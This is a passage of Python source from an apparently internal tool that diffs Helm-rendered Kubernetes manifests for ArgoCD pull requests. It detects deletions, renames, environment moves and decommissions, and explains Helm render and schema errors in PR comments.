    Two passes over the paired changes. The first collects the version
    transitions this app is taking from unambiguous carriers (image
    tags, chart labels, targetRevision, plus the app-level chart
    version_change when known). The second accepts a section only when
    EVERY changed line pairs up and classifies against that vocabulary.
    Returns None when fewer than _VERSION_FOLD_MIN sections fold (a fold
    line for one or two sections costs more attention than it saves),
    else a dict with the fold facts for the comment renderer.
    """
    if not sections:
        return None
    candidates = set()
    if (version_change and version_change[0] and version_change[1]
            and version_change[0] != version_change[1]):
        candidates.add((str(version_change[0]), str(version_change[1])))
    paired = []
    for hdr, body in sections:
        pairs = None if hdr in exempt else _fold_pairs(body)
        paired.append((hdr, pairs))
        if pairs:
            for key, old, new in pairs:
                _classify_fold_pair(key, old, new, candidates)
    foldable_headers, classes = [], set()
    chart_votes, other_votes = {}, {}
    for hdr, pairs in paired:
        if not pairs:
            continue
        ok, sec_classes, sec_votes = True, set(), []
        for key, old, new in pairs:
            cls, pair = _classify_fold_pair(key, old, new, candidates)
            if cls is None:
                ok = False
                break
            sec_classes.add(cls)
            if pair:
                sec_votes.append((cls, pair))
        if not ok:
            continue
        foldable_headers.append(hdr)
        classes |= sec_classes
        for cls, pair in sec_votes:
            book = chart_votes if cls == "chart labels" else other_votes
            book[pair] = book.get(pair, 0) + 1
    if len(foldable_headers) < _VERSION_FOLD_MIN:
        return None
    votes = chart_votes or other_votes
    label = None
    if votes:
        old, new = max(votes.items(), key=lambda kv: kv[1])[0]
        label = f"{old} \u2192 {new}"
    return {"n_foldable": len(foldable_headers),
            "n_total": len(sections),
            "label": label,
            "headers": tuple(foldable_headers),
            "classes": tuple(c for c in _FOLD_CLASS_ORDER if c in classes)}


def _package_sections(filtered_sections: list, version_change=None):
    """Build (clean_diff, stored_sections, deleted, zeroed, fingerprint,
    renamed, vm_changes, version_fold)
    from the FULL filtered section list. Detection runs here — before the
    display and AI caps — so a deletion at position 111 of a mass diff can
    never be lost again (the PR-6773 bug). The fingerprint is computed on
    the full list too (COPS-2579), before FULL_SECTIONS_MAX_PER_APP trims
    it for storage, so a genuinely-identical change still fingerprints the
    same even for an app whose resource count is at the storage limit.
    """
    deleted = _detect_deleted_resources(filtered_sections)
    # COPS-2594: a resource whose name carries a content hash, or that moves
    # to a new identity, is deleted and recreated in the SAME diff. Reporting
    # those as deletions filled the block with noise (acme-config-prod PR
    # 3882 shouted "54 RESOURCE(S) DELETED" for what was a rename-heavy
    # version bump) and a block nobody trusts is as bad as no block at all.
    created = _detect_created_resources(filtered_sections)
    deleted, renamed = _split_renames_from_deletions(deleted, created)
    zeroed  = _detect_replicas_zeroed(filtered_sections)
    # VM-domain facts, computed here for the same reason deletions are: the
    # panel that reports them must never depend on what survived a display
    # cap. The headers join the risk reservation below so the actual VM
    # section is visible in the comment, not just named by the panel —
    # detecting a risk is only half the job (the PR-3845 lesson).
    vm_changes = _detect_vm_changes(filtered_sections)
    fingerprint = _fingerprint_sections(filtered_sections)
    # Version-transition fold, computed here for the same reason deletions
    # are: on the FULL pre-cap list, so what folds and what stays inline
    # never depends on a display cap. Sections already claimed by a safety
    # fact are exempt by construction.
    exempt = (set(deleted or []) | set(zeroed or [])
              | {f["header"] for f in vm_changes})
    version_fold = _classify_version_fold(
        filtered_sections, version_change=version_change, exempt=exempt)
    needle_headers = []
    if version_fold:
        _fold_set = set(version_fold["headers"])
        needle_headers = [h for h, _ in filtered_sections
                          if h not in _fold_set and h not in exempt]
    # COPS-2567: detecting a deletion is only half the job. Give the risk
    # sections a reserved share of the display budget before the caps below
    # cut the list, otherwise the shouty block names resources the reviewer
    # cannot see anywhere in the comment.
    filtered_sections = _prioritise_risk_sections(
        filtered_sections, deleted, zeroed, RISK_SECTION_RESERVE,
        extra=[f["header"] for f in vm_changes] + needle_headers)
    display_secs = filtered_sections[:MAX_RESOURCES_FULL]
    truncated_parts = []
    for hdr, body in display_secs:
        body_t = body[:MAX_DIFF_CHARS] + "\n... (truncated)" if len(body) > MAX_DIFF_CHARS else body
        truncated_parts.append(f"===== {hdr} =====\n{body_t}")
    clean_diff = "\n".join(truncated_parts)
    stored_sections = filtered_sections[:FULL_SECTIONS_MAX_PER_APP]
    if len(stored_sections) < len(filtered_sections):
        # COPS-2610: the storage cap is memory safety and may never again
        # be silent. What it drops here is gone from BOTH surfaces -- after
        # phase E that is information that ceased to exist -- so it counts
        # itself and logs, and the FULL page names the shortfall.
        with _diff_stats_lock:
            _diff_stats["section_cap_trims"] += 1
        log(f"[sections] storage cap hit: kept {len(stored_sections)} of "
            f"{len(filtered_sections)} sections "
            f"(FULL_SECTIONS_MAX_PER_APP={FULL_SECTIONS_MAX_PER_APP})",
            "WARNING")
    return (clean_diff, stored_sections,
            deleted, zeroed, fingerprint, renamed, vm_changes, version_fold)


def _diff_resources(main_res: dict, pr_res: dict) -> str:
    """Diff two pre-parsed resource dicts (from _parse_manifest_resources).

    Returns a diff string in the ArgoCD `===== /Kind ns/name =====` format.
    Returns empty string if there are no differences.
    """
    import difflib
    all_keys = sorted(set(main_res) | set(pr_res),
                      key=lambda k: (k[0], k[1], k[2]))
    parts = []
    for key in all_keys:
        type_key, ns, name = key
        a_text = main_res.get(key, "")
        b_text = pr_res.get(key, "")
        if a_text == b_text:
            continue
        a_lines = a_text.splitlines(keepends=True)
        b_lines = b_text.splitlines(keepends=True)
        delta = list(difflib.unified_diff(a_lines, b_lines, lineterm="\n"))
        if not delta:   # pragma: no cover - differing text always diffs non-empty
            continue
        hdr = f"/{type_key} {ns}/{name}" if ns else f"/{type_key} {name}"
        parts.append(f"===== {hdr} ======\n" + "".join(delta))
    return "\n".join(parts)


def _diff_manifests(main_yaml: str, pr_yaml: str) -> str:
    """Convenience wrapper: parse both YAML strings then diff. Used only in tests."""
    return _diff_resources(
        _parse_manifest_resources(main_yaml),
        _parse_manifest_resources(pr_yaml)
    )


def _render_reason(render_err: str) -> str:
    """Classify a helm render error into a REASON_* code (FIX F, v2.4.9).

    A `helm template` failure caused by a value file that is not parseable
    YAML gets its own reason so the PR comment can tell the author to fix the
    YAML syntax, instead of the generic "helm template failed to render the
    chart with these values" which points them at chart values by mistake.
    Everything else stays REASON_RENDER.
    """
    e = (render_err or "").lower()
    # COPS-2554: match Helm's own message-independent SIGNATURE for a
    # template `required()` failure ("execution error at (<template>:<line>):
    # <message>") instead of guessing keywords from <message>, which chart
    # authors write however they like. Live PR 3823 broke on a chart's own
    # custom message ("Missing Image Tag on => platform") that contained none
    # of the previously-matched phrases and fell through to generic
    # REASON_RENDER: retried 5 times for a failure that can never resolve on
    # retry, then showed only "diff unavailable" with the real cause hidden.
    # Auditing this chart's own templates turned up more messages the old
    # keyword list silently missed the same way ("Cloud instance not found
    # for this deployment", "A valid appspace.prefix entry required!"). The
    # nil-pointer shape (accessing a field with no required() guard at all)
    # keeps its own separate check since it has a different Go-level phrase.
    if "execution error at (" in e or "nil pointer evaluating" in e:
        return REASON_MISSING_REQUIRED
    # COPS-2554: values.schema.json validation. Same class of bug -- this
    # chart ships a schema, and a violation is exactly as deterministic and
    # actionable as a missing required() value, but was not classified at
    # all before, so it too fell into the generic bucket.
    if "values don't meet the specifications of the schema" in e:
        return REASON_SCHEMA_INVALID
    if ("error converting yaml" in e or "did not find expected" in e
            or "could not find expected" in e or "mapping values are not allowed" in e
            or "yaml: line" in e or "found character that cannot start" in e
            or "yaml:" in e and "unmarshal" in e):
        return REASON_INVALID_YAML
    return REASON_RENDER


_HELM_EXEC_ERR_RE = re.compile(
    r"execution error at \(([^)]+?):(\d+):\d+\):\s*(.+)", re.DOTALL)
_HELM_TPL_ERR_RE = re.compile(
    r"template:\s*([^\s:]+?):(\d+):\d+:\s*executing[^<]*at\s*<([^>]+)>:\s*(.+)",
    re.DOTALL)


def _explain_required_error(err: str) -> list:
    """Markdown lines spelling out a REASON_MISSING_REQUIRED render failure.

    v2.6.2 (born from acme-config-dev PR #6848): when a chart's `required`
    guard trips - or a template nil-derefs a value block that is absent -
    the developer must see, in the PR comment itself: WHAT value is missing,
    WHERE in the chart it tripped, and WHERE to add it. Before this, the
    comment showed 200 raw chars of helm stderr, and reviewers were blocked
    guessing.

    Handles the two shapes helm emits:
    - `execution error at (chart/templates/x.yaml:25:15): <required msg>`
      (the chart author's own message, usually naming the values path)
    - `template: chart/templates/x.yaml:15:124: executing "..." at
      <$thing.image.tag>: nil pointer evaluating interface {}.tag`
      (no custom message - we name the dereferenced field instead)
    """
    err = err or ""
    m1 = _HELM_EXEC_ERR_RE.search(err)
    if m1:
        tpl, line, msg = m1.group(1), m1.group(2), m1.group(3).strip()
        # keep only the chart-relative template path (drop tmp dirs)
        tpl = tpl[tpl.find("templates/"):] if "templates/" in tpl else tpl
        return [
            f"> **{msg.splitlines()[0][:300]}**",
            f"> Chart template: `{tpl}:{line}`",
        ]
    m2 = _HELM_TPL_ERR_RE.search(err)
    if m2:
        tpl, line, expr, msg = (m2.group(1), m2.group(2),
                                m2.group(3).strip(), m2.group(4).strip())
        tpl = tpl[tpl.find("templates/"):] if "templates/" in tpl else tpl
        # COPS-2548 (live feedback on PR 3813): leading with the chart's own
        # loop variable told the operator nothing about their config. When the
        # chart is iterating microservice definitions, the cause is concrete
        # and worth naming: an entry exists under microservices.definitions
        # with no image mapping behind it. Everything else keeps the generic
        # wording, since we cannot know which values block a foreign chart
        # meant to read.
        field = expr.split(".", 1)[1] if "." in expr else expr
        if "microservice" in expr.lower():
            head = (f"> **A `microservices.definitions` entry has no `image` "
                    f"mapping**, so the chart could not read its `{field}`.")
        else:
            head = (f"> **The chart reads `{expr}` but that value block is "
                    f"missing or empty.**")
        return [
            head,
            f"> Chart template: `{tpl}:{line}` ({msg.splitlines()[0][:120]})",
        ]
    return [f"> {err.splitlines()[0][:300] if err else 'no error output'}"]


def _explain_schema_error(err: str) -> list:
    """Break a Helm values.schema.json failure into one violation per line.

    COPS-2554: Helm reports every schema violation in one multi-line stderr
    block. Left as raw text (or worse, collapsed to the generic "diff
    unavailable" message) an operator has to find and parse it themselves.
    Each "- ..." line IS already the specific, actionable violation, so this
    only needs to extract and re-list them, same "one thing per line"
    principle as the required-value remedies.
    """
    lines = [l.strip() for l in (err or "").splitlines()]
    violations = [l[1:].strip() for l in lines if l.startswith("-")]
    if not violations:
        return [f"> {(err or 'no error output').splitlines()[0][:300]}"]
    # COPS-2564: cap by COUNT, never by characters. PR 3837 hit 53 violations
    # and a character cap cut the last one mid path, which reads like a
    # rendering bug and hides how many were left. Ten is enough to see the
    # pattern; the remainder is stated so nobody assumes the list is complete.
    out = [f"> {v}" for v in violations[:_SCHEMA_VIOLATIONS_SHOWN]]
    extra = len(violations) - _SCHEMA_VIOLATIONS_SHOWN
    if extra > 0:
        out.append(f"> *... and {extra} more violation(s) of the same kind*")
    return out


_SCHEMA_VIOLATIONS_SHOWN = 10
_NULL_VIOLATION_RE = re.compile(r"at '([^']+)': got null, want (\w+)")


def _schema_fix_hints(err: str) -> list:
    """Extra, cause-specific advice under a schema failure.

    Generic advice ("correct each value listed above") is useless for the one
    cause we keep hitting: a key whose entire body was removed or commented
    out is read by YAML as null, and the schema then rejects it. That is what
    broke acme-config-prod PR 3837 (53 services) and, in a different file,
    COPR-31637. The fix is an explicit empty map -- and under
    microservices.definitions, deleting the key instead is actively dangerous,
    because deployment/vpa/pdb/iamPolicyMember all range over that map, so a
    missing key deletes the microservice from the environment.
    """
    nulls = _NULL_VIOLATION_RE.findall(err or "")
    if not nulls:
        return []
    hints = [
        f"> **Why:** {len(nulls)} of these are `null`, which is what YAML "
        f"gives a key whose body was deleted or commented out.",
        "> **Fix:** write an explicit empty map to keep the entry with pure "
        "chart defaults, for example `myservice: {}`.",
    ]
    if any("/microservices/definitions/" in p for p, _ in nulls):
        hints.append(
            "> \u26a0\ufe0f Do **not** delete the key instead: the chart "
            "renders one microservice per entry under "
            "`microservices.definitions`, so removing it deletes that "
            "microservice from the environment.")
    return hints


def _missing_value_remedies() -> list:
    """The remedies for a MISSING REQUIRED VALUE block, one per line.

    COPS-2548: these used to be a single long sentence that crammed two
    unrelated pieces of advice together ("define it in customer.yaml or a
    parent config.yaml" and "if the chart version changed..."), which the
    renderer showed as one wall of text. An operator had to untangle it to
    work out what to actually do. Separate lines, most likely cause first.
    """
    return [
        "> **Fix:** add the missing value to this environment's "
        "`customer.yaml`, or to the `config.yaml` of its cohort or ring if "
        "every environment at that level needs it.",
        "> If this PR moved the environment to a new folder, check that the "
        "new parent `config.yaml` carries what the old one did.",
        "> If this PR changed the chart version, the new chart may require "
        "values the old one did not.",
    ]




def _same_env_identity(old_identity: tuple, new_identity: tuple) -> bool:
    """True when two (customer_name, suffix) pairs look like the SAME
    environment (v2.5.15, Finding 7).

    customer_name is the primary key: it drives the namespace and is the
    real identity signal (confirmed on real prod renames: 'seagal'->'segal'
    is a typo fix to a DIFFERENT identity even with the same suffix, and
    'bnym--aec1'->'bny--aec1' likewise). A mismatch there is decisive
    regardless of suffix.

    suffix is compared only when BOTH sides declare one. An undeclared
    suffix on either side is UNKNOWN, not "no suffix" -- treating it as a
    mismatch would make an ordinary same-identity rename (suffix inherited
    from a parent config.yaml, not stated in the leaf file) look like a
    decommission. Missing/unparseable data on both customer_name and suffix
    degrades to trusting the rename, the same conservative-default posture
    already used elsewhere in this module (_is_version_downgrade returns
    False rather than block on noise it cannot interpret).
    """
    old_name, old_suffix = old_identity
    new_name, new_suffix = new_identity
    if old_name and new_name and old_name != new_name:
        return False
    if old_suffix and new_suffix and old_suffix != new_suffix:
        return False
    return True


# Memoizes _rename_identity_confirmed so the SAME (old, new, main_sha, pr_sha)
# question asked repeatedly within one PR run (once per app sharing an
# environment's ms/ss/glb components, plus again from
# _pr_chart_revision_checked) costs one Bitbucket fetch pair, not several.
# Shas are immutable, so a cached verdict is valid forever; bounded the same
# way _main_render_cache is (evict oldest half past the cap) since renames
# are rare but a pod can run for weeks.
_IDENTITY_RENAME_CACHE_MAX = 500
_identity_rename_verdict_cache: dict = {}
_identity_rename_verdict_lock       = threading.Lock()


def _rename_identity_confirmed(old_clean: str, new_clean: str,
                                main_sha: str, pr_sha: str) -> bool:
    """True when the identity file renamed old_clean -> new_clean describes
    the SAME environment on both sides (v2.5.15, Finding 7).

    Bitbucket's rename pairing is content-similarity based, not identity
    based (see _trusted_rename_dirs' docstring for the ancillary-file case
    this mirrors). Before this check, ANY rename of customer.yaml/
    config.yaml was trusted unconditionally as "direct evidence" of a real
    move -- correct for a folder-name-to-suffix path fix (real prod
    precedent: 'Rename folders' commit 655546c96, pv-allianzna-a ->
    pv-allianzna-c, same customerName+suffix inside both files), but wrong
    for a decommission+rebuild or region migration under a new suffix,
    which Bitbucket pairs anyway when the two customer.yaml files are
    similar enough (real prod precedents, all confirmed R53-R99 similarity
    with a changed customerName and/or suffix inside: pv-manulife-a/b,
    pv-takeda-a(na3-a)/pv-takeda-b(eu1-b), pv-asxo-a/b/c, pv-onr, pv-smbc,
    pv-seagal->pv-segal, pv-bnym--aec1->pv-bny--aec1 -- 49 such cases found
    across 600 commits of acme-config-prod history, see
    bughunt/FINDINGS_IDENTITY_AWARE_RENAME.md). Trusting those wholesale
    swapped the deleted app's PR-side render for the unrelated new
    environment's content and suppressed the decommission warning for the
    old one.

    Fetches the OLD file at main_sha and the NEW file at pr_sha and compares
    the identity each declares (_extract_appspace_identity +
    _same_env_identity). A fetch failure on either side degrades to
    trusting the rename (see _same_env_identity) rather than block on a
    transient blip.
    """
    cache_key = (old_clean, new_clean, main_sha, pr_sha)
    with _identity_rename_verdict_lock:
        cached = _identity_rename_verdict_cache.get(cache_key)
    if cached is not None:
        return cached
    try:
        old_content, _old_status = _bb_fetch_cached(old_clean, main_sha)
        new_content, _new_status = _bb_fetch_cached(new_clean, pr_sha)
    except Exception as e:
        debug(f"identity check fetch failed for {old_clean} -> {new_clean}: {e}")
        old_content = new_content = None
    old_identity = _extract_appspace_identity(old_content or "")
    new_identity = _extract_appspace_identity(new_content or "")
    verdict = _same_env_identity(old_identity, new_identity)
    if not verdict:
        log(f"identity-file rename {old_clean} -> {new_clean} rejected: "
            f"declared identity changed ({old_identity} -> {new_identity}); "
            f"treating as unrelated environments, not a move", "WARNING")
    with _identity_rename_verdict_lock:
        _identity_rename_verdict_cache[cache_key] = verdict
        if len(_identity_rename_verdict_cache) > _IDENTITY_RENAME_CACHE_MAX:
            drop = len(_identity_rename_verdict_cache) - _IDENTITY_RENAME_CACHE_MAX // 2
            for k in list(_identity_rename_verdict_cache.keys())[:drop]:
                del _identity_rename_verdict_cache[k]
    return verdict


def _trusted_rename_dirs(renames: dict, main_sha: str = None, pr_sha: str = None) -> set:
    """(old_dir, new_dir) pairs corroborated by an identity-file rename.

    v2.5.9 (live PR #6673, mirrors prod #3604 'renamed hsbc to -b for decom
    and rebuild'): Bitbucket's rename detection is CONTENT-SIMILARITY based,
    not identity based. A genuine decommission+rebuild (old env deleted, a
    differently-named new env added, deliberately different content) is
    correctly reported as delete+add for the identity file (customer.yaml /
    config.yaml) — but an ancillary file like cicd-versions.yaml is often
    boilerplate, byte-identical across unrelated environments, so Bitbucket
    pairs THAT as a 'rename' anyway. Trusting it wholesale-swapped the
    DELETED app's PR-side render for the UNRELATED new environment's
    identity: a nonsensical mixed-identity diff and a wrong chart-downgrade
    attribution (observed live). An ancillary-file rename is only believable
    when an identity file was ALSO renamed between the exact same two
    directories — that is real corroborating evidence of an actual move.

    v2.5.15 (Finding 7): the corroborating identity-file rename must ALSO
    pass the identity check (_rename_identity_confirmed) when main_sha/
    pr_sha are given -- a Class 2 false pairing (different customerName/
    suffix) is not real corroborating evidence of an actual move, so an
    ancillary file paired between the SAME two directories must not be
    trusted either. Omitting either sha keeps the pre-v2.5.15 behavior
    (presence-only, no content check) for legacy call sites.
    """
    pairs = set()
    for old_p, new_p in renames.items():
        if posixpath.basename(old_p) not in _IDENTITY_BASENAMES:
            continue
        if main_sha and pr_sha and not _rename_identity_confirmed(old_p, new_p, main_sha, pr_sha):
            continue
        pairs.add((posixpath.dirname(old_p), posixpath.dirname(new_p)))
    return pairs


def _is_trusted_rename(old_clean: str, new_clean: str, trusted_dirs: set,
                        main_sha: str = None, pr_sha: str = None) -> bool:
    """True when a specific file's rename pairing is safe to follow.

    Either the file itself IS the identity file (direct evidence), or its
    directory pair is corroborated by a separate identity-file rename
    (see _trusted_rename_dirs).

    v2.5.15 (Finding 7): the identity file being the file itself is no
    longer unconditional "direct evidence" -- see _rename_identity_confirmed
    for why a content-similarity pairing across a changed customerName/
    suffix must be refused even though it IS the identity file. Omitting
    main_sha/pr_sha keeps the pre-v2.5.15 unconditional-trust behavior for
    legacy call sites that cannot practically provide the shas.
    """
    if posixpath.basename(old_clean) in _IDENTITY_BASENAMES:
        if main_sha and pr_sha:
            return _rename_identity_confirmed(old_clean, new_clean, main_sha, pr_sha)
        return True
    return (posixpath.dirname(old_clean), posixpath.dirname(new_clean)) in trusted_dirs


def _detect_env_move(value_files: list, renames: dict, main_sha: str = None, pr_sha: str = None):
    """Detect whether this app's environment folder was moved in the PR.

    v2.5.8 (T2b, live PR #6666, mirrors prod #3597 'move envs into monthly
    cadence'): a folder move changes WHICH tier/region defaults apply,
    because the app's valueFiles carry relative parent references
    (<env>/../config.yaml). The per-file rename-following (Finding 6) only
    remaps the moved files themselves; the parent refs kept resolving to
    the OLD tier — whose config.yaml still exists — so both diff sides
    rendered with identical inputs and a real chart-version change showed
    as "No manifest changes" (false clean).

    v2.5.9: only trust the rename when the matched file IS the identity file
    (customer.yaml/config.yaml) — see _trusted_rename_dirs for why an
    ancillary-file-only match must never imply a move.

    v2.5.15 (Finding 7): being the identity file is no longer enough by
    itself -- a path-based candidate is also required to pass
    _rename_identity_confirmed (same declared customerName/suffix on both
    sides) before being trusted as a real move. A path-only candidate that
    fails this check is not returned; the caller's normal per-file fallback
    then treats the old path as a genuine deletion (correct: the identity
    changed, so this is a decommission+rebuild or migration, not a move of
    THIS environment). Omitting main_sha/pr_sha keeps the pre-v2.5.15
    path-only behavior for legacy call sites.

    Returns (old_env_dir, new_env_dir) when some rename's old side is one
    of this app's value files AND the directory actually changed AND (when
    shas are given) the identity check passes, else None.
    """
    if not renames:
        return None
    clean_vfs = {
        posixpath.normpath(vf.replace("$config/", "").lstrip("/"))
        for vf in value_files
    }
    for old_p, new_p in renames.items():
        if old_p not in clean_vfs:
            continue
        if posixpath.basename(old_p) not in _IDENTITY_BASENAMES:
            continue
        old_dir = posixpath.dirname(old_p)
        new_dir = posixpath.dirname(new_p)
        if old_dir == new_dir:
            continue
        if main_sha and pr_sha and not _rename_identity_confirmed(old_p, new_p, main_sha, pr_sha):
            continue
        return old_dir, new_dir
    return None


def _moves_missing_cohort(renames: dict, pr_sha: str, repo: str = None) -> list:
    """Moved environments whose DESTINATION has no cohort config.yaml.

    COPS-2552, regression found on live PR 3816. The v2.13.5 identity-move
    pairing correctly kills the false decommission, but pairing also removes
    the new path from the new-environment candidate list, and the cohort guard
    added in v2.13.2 only ever ran over that list. So the exact case the guard
    exists for stopped being checked: a move into a folder with no cohort file
    posted SUCCESSFUL, and merging it would have made the ApplicationSet matrix
    yield zero Applications for a live production customer.

    A moved environment needs its destination cohort file exactly as much as a
    brand-new one. Same rules as the new-env guard: only a genuine 404 blocks
    (a transient error is not a fact), and gcp/aec paths are exempt because
    those six ApplicationSets have no cohort generator.
    """
    out = []
    for old, new in (renames or {}).items():
        parts = new.split("/")
        if len(parts) < 5 or parts[-1] not in _IDENTITY_BASENAMES:
            continue
        env_dir = new.rsplit("/", 1)[0]
        if env_dir.startswith("gcp/aec/") or "/" not in env_dir:
            continue
        cohort = env_dir.rsplit("/", 1)[0] + "/config.yaml"
        _c, st = _bb_fetch_cached(cohort, pr_sha, repo=repo)
        if st == BB_NOT_FOUND:
            out.append({"env": env_dir.rsplit("/", 1)[-1], "old": old,
                        "new": new, "cohort": cohort})
    return out


def _moves_missing_cohort_lines(blocked: list) -> list:
    """Render the blocking section for moves missing their cohort file."""
    lines = []
    for b in blocked:
        lines += [
            f"\u26d4 **`{b['env']}` is being moved, but its new folder has no "
            f"cohort `config.yaml`.**",
            "",
            f"Moved: `{b['old'].rsplit('/', 1)[0]}` \u2192 "
            f"`{b['new'].rsplit('/', 1)[0]}`",
            "",
            f"The ApplicationSet generator loads `{b['cohort']}` next to every "
            f"environment folder, and that file does not exist at this commit. "
            f"Without it the generator produces zero Applications for this "
            f"environment, so merging this PR removes it from ArgoCD instead of "
            f"moving it.",
            "",
            f"**Fix:** add `{b['cohort']}` to this PR. A 4 line placeholder is "
            f"enough, see "
            f"`gcp/prod/private-cloud/eu1-b/hardcoded/migration/monthly/config.yaml`.",
            "",
        ]
    return lines


def _augment_renames_with_identity_moves(changed_files: list, renames: dict,
                                          path_map: dict, main_sha: str,
                                          pr_sha: str, repo: str = None) -> dict:
    """Synthesize rename pairings from declared identity (COPS-2545, F2).

    Bitbucket pairs renames by content similarity. A real folder move whose
    identity file is rewritten on the way (the hardcoded/migration flatten:
    12 -> 497 lines on live PR #3796) falls below the similarity threshold,
    arrives as a bare delete + add, and everything downstream misfires: the
    decommission detector shouts, the new-env path evaluates a duplicate,
    and the reviewer reads that the same environment is both going away and
    brand new. The identity the files DECLARE is the signal similarity
    cannot see, and it is the same signal v2.5.15 already trusts to verify
    the pairings Bitbucket does produce.

    For every identity file (customer.yaml/config.yaml) that belongs to an
    existing app (path_map), is not already a rename old-side, and is
    genuinely deleted at pr_sha (BB_NOT_FOUND), extract its identity at
    main_sha and compare against every added identity file at env depth
    that is not already a rename new-side. Exactly one match on both sides
    -> synthesize the pairing (the v2.5.15 verification downstream will
    re-confirm it from the same cached fetches). Ambiguity, a mismatch, or
    any fetch error leaves the pairing alone: the conservative outcome is
    the existing loud decommission warning, never a silent guess.
    """
    out = dict(renames or {})
    try:
        old_sides = set(out.keys())
        new_sides = set(out.values())
        deleted, added = [], []
        for f in changed_files:
            parts = f.split("/")
            if len(parts) < 5 or parts[-1] not in ("customer.yaml", "config.yaml"):
                continue
            if f in path_map and f not in old_sides:
                _c, st = _bb_fetch_cached(f, pr_sha, repo=repo)
                if st == BB_NOT_FOUND:
                    deleted.append(f)
            elif f not in path_map and f not in new_sides:
                _c, st = _bb_fetch_cached(f, pr_sha, repo=repo)
                if st == BB_OK and _c:
                    # Only files that DECLARE an identity may compete for the
                    # pairing. A cohort/defaults config.yaml declares none, and
                    # _same_env_identity treats (None, None) as compatible with
                    # anything, so including it made every real move ambiguous
                    # and the pairing was dropped in silence. Live PR 3811 still
                    # reported a decommission for a pure move because of this,
                    # and the original tests missed it by never having the
                    # cohort file present at pr_sha -- which is exactly the
                    # shape COPS-2544 now requires in production.
                    _nid = _extract_appspace_identity(_c)
                    if _nid[0] is not None:
                        added.append((f, _nid))
        if not deleted or not added:
            return out
        for old in deleted:
            old_content, st_old = _bb_fetch_cached(old, main_sha, repo=repo)
            if st_old != BB_OK or not old_content:
                continue
            old_id = _extract_appspace_identity(old_content)
            if old_id[0] is None:
                continue
            matches = [nf for nf, nid in added if _same_env_identity(old_id, nid)]
            if len(matches) == 1:
                out[old] = matches[0]
                log(f"identity move detected: {old} -> {matches[0]} "
                    f"(Bitbucket did not pair the rename; matched by "
                    f"declared identity {old_id})")
    except Exception as e:
        debug(f"identity move augmentation skipped: {e}")
        return dict(renames or {})
    return out


def _detect_env_decommission_candidates(changed_files: list, path_map: dict, renames: dict,
                                         main_sha: str = None, pr_sha: str = None) -> list:
    """Identify environments fully decommissioned (deleted, no successor).

    v2.5.10 (explicit request): distinct from a tier move (v2.5.8, identity
    file renamed to a new dir — handled by _detect_env_move) and from a
    rebuild under a new name (v2.5.9, old identity file genuinely deleted
    but a DIFFERENT new one is added elsewhere — that shows up as its own
    new-env section). This is the narrower "an environment is simply going
    away, nothing replaces it" case, which deserves its own loud warning:
    which environment, what version, what is being removed.

    An identity file (customer.yaml/config.yaml) qualifies as a per-env
    root — not a shared ancestor default that happens to share the
    basename — only when EVERY app it maps to is named "<env_name>-...",
    matching this codebase's app-naming convention observed throughout
    (pv-qa-15-a-ms, cl-qa-14-a-glb, etc.). A shared default at a shallow
    directory (gcp/qa/config.yaml) maps to apps whose names do NOT start
    with its own directory's basename ("qa"), so it is naturally excluded.

    v2.5.15 (Finding 7): a rename pairing on the identity file only excludes
    a candidate here when it is a CONFIRMED same-environment move
    (_rename_identity_confirmed). A Class 2 pairing (decommission+rebuild or
    a migration under a new suffix — content-similar enough for Bitbucket
    to pair, but a genuinely DIFFERENT environment; real prod precedents in
    bughunt/FINDINGS_IDENTITY_AWARE_RENAME.md) must still be evaluated as a
    decommission of the OLD environment: _detect_env_move already refuses
    to treat this as a move, so without this change nothing would ever flag
    the old side as going away — it would just silently fail to render.
    Omitting main_sha/pr_sha keeps the pre-v2.5.15 behavior (any presence in
    renames excludes the candidate) for legacy call sites.

    Returns a list of {"env_name", "identity_file", "apps"} dicts.
    """
    renames = renames or {}
    candidates = []
    seen_identity_files = set()
    for f in changed_files:
        clean = posixpath.normpath(f.lstrip("/"))
        if clean in seen_identity_files:
            continue
        if posixpath.basename(clean) not in _IDENTITY_BASENAMES:
            continue
        if clean in renames:
            if main_sha and pr_sha:
                if _rename_identity_confirmed(clean, renames[clean], main_sha, pr_sha):
                    continue  # confirmed real move (v2.5.8) — not a decommission
                # else: paired by Bitbucket, but the declared identity
                # changed — fall through, evaluate as a decommission below.
            else:
                continue  # legacy behavior: presence alone excludes it
        apps = path_map.get(clean)
        if not apps:
            continue  # not a currently-live environment
        env_name = posixpath.basename(posixpath.dirname(clean))
        if not all(a.split("/")[-1].startswith(env_name + "-") for a in apps):
            continue  # shared ancestor default, not this env's own identity file
        seen_identity_files.add(clean)
        candidates.append({"env_name": env_name, "identity_file": clean, "apps": list(apps)})
    return candidates


def _render_main_side_resources(app: str, main_sha: str) -> dict:
    """Render an app's CURRENT (main-side, pre-merge) manifest.

    Used only by the decommission warning to show what a full environment
    deletion would remove. Reuses _main_render_cache when a normal diff for
    this app already populated it this run (common: an env's glb/ms/ss apps
    are usually ALL affected by the same PR, so one of them likely already
    rendered). Raises on failure — the caller treats this as best-effort and
    degrades gracefully (the confirmed deletion is the important fact; a
    resource list is a nice-to-have).
    """
    chart_name  = _app_chart_map.get(app)
    main_rev    = _app_chart_revision_map.get(app)
    registry    = _app_chart_registry_map.get(app, "")
    value_files = _app_value_files_map.get(app, [])
    namespace   = _app_namespace_map.get(app, "")
    release     = app.split("/")[-1]
    if not (chart_name and main_rev and registry and value_files):
        raise RuntimeError(f"app metadata not in cache for {app}")
    main_pull_gen = _helm_chart_pull_ts.get(f"{registry}/{chart_name}:{main_rev}", 0)
    cache_key = (app, main_sha, main_rev, main_pull_gen)
    with _main_render_lock:
        cached = _main_render_cache.get(cache_key)
    if cached is not None:
        return cached
    main_chart = _ensure_chart(registry, chart_name, main_rev)
    if not main_chart:
        raise RuntimeError(f"chart pull failed for {chart_name}:{main_rev}")
    main_vals = _fetch_value_files(value_files, main_sha)
    main_yaml, err = _helm_template(main_chart, release, namespace, main_vals)
    if err or not main_yaml:
        raise RuntimeError(err or "empty render")
    resources = _parse_manifest_resources(main_yaml)
    with _main_render_lock:
        _main_render_cache[cache_key] = resources
    return resources


_DECOM_WORKLOAD_KINDS = ("Deployment", "StatefulSet", "DaemonSet", "CronJob", "Job")
DECOM_WORKLOADS_MAX_SHOWN = 40


def _summarize_resources_dict(resources: dict) -> tuple:
    """(total, kind_counts, workload_names) from a _parse_manifest_resources dict."""
    kind_counts = {}
    workloads = set()
    for (type_key, _ns, name) in resources:
        kind_counts[type_key] = kind_counts.get(type_key, 0) + 1
        if type_key.split("/")[-1] in _DECOM_WORKLOAD_KINDS:
            workloads.add(name)
